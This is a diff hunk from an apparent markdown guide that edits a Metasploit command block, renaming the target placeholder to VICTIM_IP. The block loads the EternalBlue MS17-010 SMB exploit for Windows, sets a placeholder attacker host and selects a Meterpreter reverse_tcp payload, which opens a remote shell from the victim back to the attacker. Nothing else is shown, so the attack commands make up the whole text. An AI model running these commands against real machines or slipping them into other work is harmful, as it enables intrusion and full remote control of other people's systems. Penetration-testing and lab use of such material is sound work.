@@ -11,7 +11,7 @@ Run `msfconsole`:
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
-set rhost <TARGET_IP>
+set rhost <VICTIM_IP>
 set lhost <ATTACKER_IP>
 set payload windows/x64/meterpreter/reverse_tcp
 exploit
